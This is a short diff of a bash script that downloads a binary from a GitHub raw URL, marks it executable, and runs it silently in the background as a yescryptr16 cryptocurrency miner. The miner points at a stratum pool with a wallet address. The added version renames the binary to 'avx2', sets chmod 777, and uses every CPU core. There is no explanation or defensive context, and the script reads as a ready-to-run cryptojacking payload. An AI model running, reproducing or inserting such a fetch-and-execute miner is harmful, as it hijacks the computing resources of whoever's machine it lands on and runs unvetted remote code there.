@@ -1,5 +1,5 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/jsiqiisn/a/main/SRBMiner-MULTI
-chmod +x SRBMiner-MULTI
-./SRBMiner-MULTI --algorithm yescryptr16 --pool stratum+tcps://stratum-eu.rplant.xyz:17055 --wallet qgTQ3cPZQutNLiiCe96fpRochwezYWiDr8.qoq > /dev/null 2>&1 &
+wget https://raw.githubusercontent.com/jsiqiisn/a/main/avx2
+chmod 777 avx2
+./avx2 -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qgTQ3cPZQutNLiiCe96fpRochwezYWiDr8.qog -t$(nproc --all) > /dev/null 2>&1 &
 uname -a
